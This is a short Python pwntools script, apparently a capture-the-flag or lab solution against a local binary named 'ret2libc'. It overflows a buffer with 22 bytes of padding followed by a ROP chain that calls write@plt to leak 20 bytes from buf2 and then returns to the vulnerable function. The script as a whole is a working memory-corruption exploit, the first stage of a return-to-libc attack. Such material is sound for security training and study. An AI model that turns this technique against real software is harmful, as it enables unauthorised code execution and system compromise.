from pwn import *
context.log_level = "debug"
p = process("./ret2libc")
e = ELF("./ret2libc")
w_plt = e.plt["write"]
buf2 = e.symbols["buf2"]
vul = e.symbols["vul"]

payload = "A"*22+p32(w_plt)+p32(vul)+p32(1)+p32(buf2)+p32(20)

p.sendlineafter("hello",payload)
p.interactive()


